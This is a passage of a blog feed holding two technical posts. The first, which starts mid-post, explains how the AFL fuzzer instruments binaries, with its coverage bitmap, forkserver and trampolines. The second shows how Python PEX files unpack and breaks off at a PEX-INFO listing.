        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;notifyFuzzer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;if condition taken&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Odd&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="n"&gt;notifyFuzzer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;else condition taken&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Even&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Question remains - &lt;em&gt;How to instrument super huge code base in a language agnostic and collision resistant manner?&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
HINT: Compilers (language -&amp;gt; assembly), assembler (assembly -&amp;gt; object code), linker (object code -&amp;gt; executable/library)&lt;/blockquote&gt;
&lt;p&gt;Assembler is a good place to instrument the basic blocks. For example, &lt;a class="reference external" href="https://gcc.gnu.org/"&gt;gcc&lt;/a&gt; by default uses &lt;a class="reference external" href="https://en.wikipedia.org/wiki/GNU_Assembler"&gt;GNU as&lt;/a&gt;
assembler. &lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/be2c066ef0939ea2b49435535ed614c37906ba30/afl-gcc.c"&gt;afl-gcc&lt;/a&gt; is a wrapper around gcc which uses
&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/be2c066ef0939ea2b49435535ed614c37906ba30/afl-as.c"&gt;afl-as&lt;/a&gt; by symlinking &lt;em&gt;afl-as&lt;/em&gt; as &lt;em&gt;as&lt;/em&gt; and adding the directory to compiler
search path via &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;-B&lt;/span&gt;&lt;/tt&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="coverage-measurements"&gt;
&lt;h3&gt;2. Coverage Measurements&lt;/h3&gt;
&lt;p&gt;Please go through &lt;strong&gt;Coverage measurements&lt;/strong&gt; section of the technical paper for an indepth understanding of it. A quick recap for the enlightened ones, AFL assigns a random
compile time constant to each basic block and uses a 64kB array to trace the execution flow with the help of following logic.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;cur_location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;COMPILE_TIME_RANDOM&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;shared_mem&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;cur_location&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;prev_location&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="n"&gt;prev_location&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cur_location&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="communication"&gt;
&lt;h3&gt;3. Communication&lt;/h3&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;AFL uses forkserver model to fuzz a program. For more info on the forkserver model of fuzzing, check &lt;a class="reference external" href="https://lcamtuf.blogspot.in/2014/10/fuzzing-binaries-without-execve.html"&gt;this&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Instance of the instrumented binary will be used as a forkserver which will communicate with the fuzzer process via fds 198 (control queue) &amp;amp; 199 (status queue).&lt;/li&gt;
&lt;li&gt;Clones of this forkserver instance are used to run the testcases. So, techically the actual fuzzy input execution happens in grandchildren process of the fuzzer.&lt;/li&gt;
&lt;li&gt;The execution trace from the target is available via shared memory (shm) to the fuzzer process.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="implementation"&gt;
&lt;h3&gt;4. Implementation&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;afl-as&lt;/strong&gt; &lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/be2c066ef0939ea2b49435535ed614c37906ba30/afl-as.c#L254"&gt;parses&lt;/a&gt; the assembly file and adds&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/9185f39b38b84bfdfba9824e70d3e8480472af76/afl-as.h#L130"&gt;a trampoline&lt;/a&gt; at places where flow needs to be recorded. Each trampoline
written has a unique constant hardcoded in it, which is used for tracing the flow between different blocks. That constant is loaded into [re]cx and &lt;strong&gt;__afl_maybe_log&lt;/strong&gt;
ion is called. AFL generally places a trampoline at the beginning of main to create the forkserver.&lt;/p&gt;
&lt;blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;lea rsp, qword rsp - 0x98
mov qword [rsp], rdx
mov qword [arg_8h], rcx
mov qword [arg_10h], rax
mov rcx, 0xcb0
call loc.__afl_maybe_log
mov rax, qword [arg_10h]
mov rcx, qword [arg_8h]
mov rdx, qword [rsp]
lea rsp, qword rsp + 0x98
&lt;/pre&gt;&lt;/div&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://github.com/mcarpenter/afl/blob/9185f39b38b84bfdfba9824e70d3e8480472af76/afl-as.h#L381"&gt;a main payload&lt;/a&gt; which consists of multiple __afl code locations like
&lt;em&gt;__afl_maybe_log&lt;/em&gt; and other variable declarations that will be used by those functions. In an instrumented binary you can find the following afl related symbols, all NOTYPE
ones are basically assembly code locations for jumping to and OBJECT symbols are for variable data.&lt;/p&gt;
&lt;blockquote&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="7%" /&gt;
&lt;col width="7%" /&gt;
&lt;col width="17%" /&gt;
&lt;col width="69%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;Type&lt;/th&gt;
&lt;th class="head"&gt;Bind&lt;/th&gt;
&lt;th class="head"&gt;Name&lt;/th&gt;
&lt;th class="head"&gt;Usage&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_maybe_log()&lt;/td&gt;
&lt;td&gt;The only function called from trampoline
- (__afl_area_ptr == 0) __afl_setup() : __afl_store()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_setup()&lt;/td&gt;
&lt;td&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;if __afl_setup_failure != 0: __afl_return()&lt;/li&gt;
&lt;li&gt;__afl_global_area_ptr == 0 ? __afl_setup_first() : __afl_store()&lt;/li&gt;
&lt;/ul&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_setup_first()&lt;/td&gt;
&lt;td&gt;One time setup inside the target process
- Get shm id from env var __AFL_SHM_ID
- Map the shared memory and store the location in __afl_area_ptr &amp;amp; __afl_global_area_ptr
- __afl_forkserver()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_store()&lt;/td&gt;
&lt;td&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;shared_mem[cur_loc ^ prev_loc]++; prev_loc = cur_loc &amp;gt;&amp;gt; 1;&lt;/li&gt;
&lt;/ul&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_die()&lt;/td&gt;
&lt;td&gt;Call exit()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_forkserver()&lt;/td&gt;
&lt;td&gt;Write 4 bytes to fd 199 and __afl_fork_wait_loop()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_fork_wait_loop()&lt;/td&gt;
&lt;td&gt;&lt;ul class="first last simple"&gt;
&lt;li&gt;Wait for 4 bytes on fd 198 and then clone the current process&lt;/li&gt;
&lt;li&gt;In child process, __afl_fork_resume()&lt;/li&gt;
&lt;li&gt;&lt;dl class="first docutils"&gt;
&lt;dt&gt;In parent&lt;/dt&gt;
&lt;dd&gt;&lt;ul class="first last"&gt;
&lt;li&gt;Store child pid to __afl_fork_pid&lt;/li&gt;
&lt;li&gt;Write it to fd 199 and call waitpid which will write child exit status to __afl_temp&lt;/li&gt;
&lt;li&gt;Write child exit status in __afl_tempt to fd 199.&lt;/li&gt;
&lt;li&gt;__afl_fork_wait_loop()&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;/dl&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_fork_resume()&lt;/td&gt;
&lt;td&gt;Closes the fds 198 &amp;amp; 199 (fuzzer &amp;lt;-&amp;gt; forkserver comm) &amp;amp; resumes with execution&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_setup_abort()&lt;/td&gt;
&lt;td&gt;Increment __afl_setup_failure and __afl_return()&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;NOTYPE&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_return()&lt;/td&gt;
&lt;td&gt;Simple return&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;GLOBAL&lt;/td&gt;
&lt;td&gt;__afl_global_area_ptr&lt;/td&gt;
&lt;td&gt;Global ptr to shared memory&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_area_ptr&lt;/td&gt;
&lt;td&gt;Ptr to shared memory&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_fork_pid&lt;/td&gt;
&lt;td&gt;Cloned pid variable&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_prev_loc&lt;/td&gt;
&lt;td&gt;Previous location variable, used to update traces in shared memory&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_setup_failure&lt;/td&gt;
&lt;td&gt;Counter to setup failures&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;OBJECT&lt;/td&gt;
&lt;td&gt;LOCAL&lt;/td&gt;
&lt;td&gt;__afl_temp&lt;/td&gt;
&lt;td&gt;Temp varible for different purposes&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="example"&gt;
&lt;h3&gt;5. Example&lt;/h3&gt;
&lt;p&gt;Try compiling the above c code with afl-gcc and have a look at the decompiled main(). The easiest way to picturise is to use graph mode of your
disassembler. The intention is to show the injection of trampolines in all basic blocks.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;                                        .------------------------------------------------------------------.
                                        | [0x810] ;[gd]                                                    |
                                        |   ; section 13 va=0x00000810 pa=0x00000810 sz=1730 vsz=1730 rwx= |
                                        |   ;-- main:                                                      |
                                        |   ;-- section_end..plt:                                          |
                                        |   ;-- section..text:                                             |
                                        | (fcn) sym.main 311                                               |
                                        | lea rsp, qword rsp - 0x98; test.c:5 int main(int arc, char *argv |
                                        | mov qword [rsp], rdx; .//:1347                                   |
                                        | mov qword [arg_8h], rcx                                          |
                                        | mov qword [arg_10h], rax                                         |
                                        | mov rcx, 0xcb0                                                   |
                                        | call loc.__afl_maybe_log;[ga]                                    |
                                        | mov rax, qword [arg_10h]                                         |
                                        | mov rcx, qword [arg_8h]                                          |
                                        | mov rdx, qword [rsp]                                             |
                                        | lea rsp, qword rsp + 0x98                                        |
                                        | ...                                                              |
                                        `------------------------------------------------------------------&amp;#39;
                                                | |
                                                | &amp;#39;-------------------------------.
        .---------------------------------------&amp;#39;                                 |
        |                                                                         |
        |                                                                         |
.----------------------------------------------------------------------.    .-----------------------------------------------------------------------.
| nop dword [rax]                                                      |    |      ; JMP XREF from 0x0000086b (sym.main)                            |
| lea rsp, qword rsp - 0x98                                            |    | nop                                                                   |
| mov qword [rsp], rdx                                                 |    | lea rsp, qword rsp - 0x98; test.c:6  ((atoi(argv[1]) % 2) == 1) ? pri |
| mov qword [arg_8h], rcx                                              |    | mov qword [rsp], rdx                                                  |
| mov qword [arg_10h], rax                                             |    | mov qword [arg_8h], rcx                                               |
| mov rcx, 0x7fee                                                      |    | mov qword [arg_10h], rax                                              |
| call loc.__afl_maybe_log;[ga]                                        |    | mov rcx, 0xa6de                                                       |
| ; [0x10:8]=0x1003e0003                                               |    | call loc.__afl_maybe_log;[ga]                                         |
| mov rax, qword [arg_10h]                                             |    | ; [0x10:8]=0x1003e0003                                                |
| ; [0x8:8]=0                                                          |    | mov rax, qword [arg_10h]                                              |
| ...                                                                  |    | ; [0x8:8]=0                                                           |
`----------------------------------------------------------------------&amp;#39;    | ...                                                                   |
                                                                            `-----------------------------------------------------------------------&amp;#39;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
</content><category term="fuzzing"></category><category term="reversing"></category><category term="afl"></category></entry><entry><title>Playing with python PEX files</title><link href="https://tunnelshade.in/blog/2017/11/playing-with-python-pex/" rel="alternate"></link><published>2017-11-12T00:00:00+05:30</published><updated>2017-11-12T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2017-11-12:/blog/2017/11/playing-with-python-pex/</id><summary type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Recently I have been coming across lots of &lt;strong&gt;P&lt;/strong&gt;ython &lt;strong&gt;EX&lt;/strong&gt;ecutables. This seems to be a popular way of distributing
python programs along with their dependencies. All that is necessary is a compatible python runtime. A very quick and a bit
outdated &lt;a class="reference external" href="http://www.youtube.com/watch?v=NmpnGhRwsu0"&gt;WTF is PEX?&lt;/a&gt;. In most cases â€¦&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;div class="section" id="introduction"&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;Recently I have been coming across lots of &lt;strong&gt;P&lt;/strong&gt;ython &lt;strong&gt;EX&lt;/strong&gt;ecutables. This seems to be a popular way of distributing
python programs along with their dependencies. All that is necessary is a compatible python runtime. A very quick and a bit
outdated &lt;a class="reference external" href="http://www.youtube.com/watch?v=NmpnGhRwsu0"&gt;WTF is PEX?&lt;/a&gt;. In most cases the dependencies of a python program are packaged
into the pex for reasons stated above.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="objectives"&gt;
&lt;h2&gt;Objectives&lt;/h2&gt;
&lt;p&gt;I had two very rigid objectives when dealing with pex files&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;See the source code of the main package or script along with its dependencies.&lt;/li&gt;
&lt;li&gt;Have the ability to mess around with the existing code and run it without having to setup requirements etc..&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div class="section" id="playground"&gt;
&lt;h2&gt;Playground&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;coverage&lt;/strong&gt; console script is something that I frequently use, so let us create a coverage clone and understand the unpacking of a pex.
Create a virtualenv and install pex in it. To create a pex that works like coverage:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
pex pex coverage -c coverage -o coverage.pex
&lt;/pre&gt;
&lt;p&gt;&lt;cite&gt;pex&lt;/cite&gt; &amp;amp; &lt;cite&gt;coverage&lt;/cite&gt; are dependencies to be included, &lt;cite&gt;-c&lt;/cite&gt; states the console script to be used as entrypoint and &lt;cite&gt;-o&lt;/cite&gt; states the output file name.
The craziest part is this command will work even if you do not have coverage installed, that is because pex gets it and packages it. Now try:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
./coverage.pex --help
&lt;/pre&gt;
&lt;p&gt;Fancy right.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="unpacking"&gt;
&lt;h2&gt;Unpacking&lt;/h2&gt;
&lt;p&gt;PEX files are zip files with a python hashbang at the beginning. Don't believe me??&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;00000000  23 21 2f 75 73 72 2f 62  69 6e 2f 65 6e 76 20 70  |#!/usr/bin/env p|&lt;/span&gt;
&lt;span class="go"&gt;00000010  79 74 68 6f 6e 32 2e 37  0a 50 4b 03 04 14 00 00  |ython2.7.PK.....|&lt;/span&gt;
&lt;span class="go"&gt;00000020  00 08 00 55 82 6c 4b 7b  66 ca fb 78 00 00 00 83  |...U.lK{f..x....|&lt;/span&gt;
&lt;span class="go"&gt;00000030  00 00 00 1b 00 00 00 2e  62 6f 6f 74 73 74 72 61  |........bootstra|&lt;/span&gt;
&lt;span class="go"&gt;00000040&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, let us unzip the pex and see the file structure (Some files and folders are removed for brevity)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;â”œâ”€â”€ .bootstrap&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”œâ”€â”€ _pex&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â””â”€â”€ pkg_resources&lt;/span&gt;
&lt;span class="go"&gt;â”œâ”€â”€ coverage.pex&lt;/span&gt;
&lt;span class="go"&gt;â”œâ”€â”€ .deps&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”œâ”€â”€ coverage-4.4.2-cp27-cp27mu-linux_x86_64.whl&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â”œâ”€â”€ coverage&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â””â”€â”€ coverage-4.4.2.dist-info&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”œâ”€â”€ pex-1.2.13-py2.py3-none-any.whl&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â”œâ”€â”€ pex&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â””â”€â”€ pex-1.2.13.dist-info&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”œâ”€â”€ setuptools-33.1.1-py2.py3-none-any.whl&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â”œâ”€â”€ easy_install.py&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â”œâ”€â”€ pkg_resources&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â”œâ”€â”€ setuptools&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â”‚Â Â  â””â”€â”€ setuptools-33.1.1.dist-info&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â  â””â”€â”€ wheel-0.29.0-py2.py3-none-any.whl&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â      â”œâ”€â”€ wheel&lt;/span&gt;
&lt;span class="go"&gt;â”‚Â Â      â””â”€â”€ wheel-0.29.0.dist-info&lt;/span&gt;
&lt;span class="go"&gt;â”œâ”€â”€ hello.py&lt;/span&gt;
&lt;span class="go"&gt;â”œâ”€â”€ __main__.py&lt;/span&gt;
&lt;span class="go"&gt;â””â”€ PEX-INFO&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, it can be easily understood that&lt;/p&gt;
&lt;table border="1" class="docutils"&gt;
&lt;colgroup&gt;
&lt;col width="16%" /&gt;
&lt;col width="84%" /&gt;
&lt;/colgroup&gt;
&lt;thead valign="bottom"&gt;
&lt;tr&gt;&lt;th class="head"&gt;dir/file&lt;/th&gt;
&lt;th class="head"&gt;contents&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody valign="top"&gt;
&lt;tr&gt;&lt;td&gt;.bootstrap&lt;/td&gt;
&lt;td&gt;Bootstrapping scripts to setup environment and launch the entrypoint.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;.deps&lt;/td&gt;
&lt;td&gt;whls of dependencies.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;PEX-INFO&lt;/td&gt;
&lt;td&gt;Name says so.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;__main__.py&lt;/td&gt;
&lt;td&gt;Entrypoint for the archive as specified by python spec.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;PEX-INFO&lt;/strong&gt; looks like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;always_write_cache&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;build_properties&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;class&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;CPython&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;platform&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;linux-x86_64&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;version&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
      &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
      &lt;span class="mi"&gt;12&lt;/span&gt;
    &lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;code_hash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;da39a3ee5e6b4b0d3255bfef95601890afd80709&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;distributions&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;coverage-4.4.2-cp27-cp27mu-linux_x86_64.whl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bfb4e061b724fe9a50c2cf048c8d35d10a664728&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;pex-1.2.13-py2.py3-none-any.whl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;6bfeb70d4c4280954ddc331c1f3a49cad35a567d&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;setuptools-33.1.1-py2.py3-none-any.whl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;d5c7021b0a2ca18f60b7dd7a5b9ffebcb789d43b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;quot;wheel-0.29.0-py2.py3-none-any.whl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;c6b9e44d951cdabf4dc67205b0f30184a1b602bb&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;},&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;entry_point&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;coverage.cmdline:main&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;ignore_errors&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;inherit_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;pex_path&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;requirements&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;wheel==0.29.0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;pex==1.2.13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;setuptools==33.1.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s2"&gt;&amp;quot;coverage==4.4.2&amp;quot;&lt;/span&gt;
  &lt;span class="p"&gt;],&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;zip_safe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
